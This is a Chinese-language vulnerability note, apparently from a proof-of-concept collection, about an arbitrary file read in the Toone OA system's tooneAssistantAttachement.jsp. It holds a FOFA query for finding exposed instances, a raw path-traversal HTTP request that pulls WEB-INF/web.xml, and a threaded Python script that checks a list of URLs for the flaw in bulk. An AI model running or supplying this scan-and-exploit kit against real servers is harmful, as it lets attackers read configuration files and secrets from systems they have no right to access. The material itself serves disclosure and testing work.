# 同望OA系统接口tooneAssistantAttachement.jsp任意文件读取漏洞

该网站存在任意文件读取漏洞，攻击者可以通过精心构造的请求参数访问服务器上的任意文件。具体来说，攻击者可以通过以下URL访问到 `web.xml` 文件：通过这种方式，攻击者可以读取应用程序的配置文件，如 `web.xml`，以及其他敏感文件，从而获取应用程序的内部结构和配置信息。这可能导致进一步的攻击，如SQL注入、远程代码执行等。

fofa:

```
body="loginAction.struts?actionType=blockLogin"
```

poc:

```
GET /jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537
Accept-Encoding: gzip
Connection: close
```

批量检测脚本:

```
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from urllib.parse import urlparse

def is_valid_url(url):
    """检查 URL 是否有效"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def add_protocol(url):
    """为 URL 添加 HTTP 协议头"""
    if not url.startswith('http'):
        return 'http://' + url
    return url

def test_vulnerability(url):
    """测试 URL 是否存在漏洞"""
    full_url = f"{url}/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml"
    
    try:
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200:
            print(f"[+] 可能存在的漏洞url: {url}")
        else:
            print(f" Not vulnerable: {url} (Status Code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f" Error testing {url}: {str(e)}")

def main():
    urls = []
    with open("url.txt", "r") as file:
        for line in file:
            url = line.strip()
            if is_valid_url(url):
                urls.append(url)
            else:
                # 尝试修复 URL
                fixed_url = add_protocol(url)
                if is_valid_url(fixed_url):
                    urls.append(fixed_url)
                else:
                    print(f"[-] Invalid URL: {url}")

    # 使用线程池执行任务
    max_workers = 10  # 可以根据系统资源调整线程数量
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_vulnerability, url): url for url in urls}
        
        for future in as_completed(futures):
            url = futures[future]
            try:
                data = future.result()
            except Exception as exc:
                print(f" Error occurred while testing {url}: {exc}")

if __name__ == "__main__":
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"\n--- Total time taken: {end_time - start_time:.2f} seconds ---")
```

使用方法:

```
python poc.py
目录下要要一个url.txt
```



















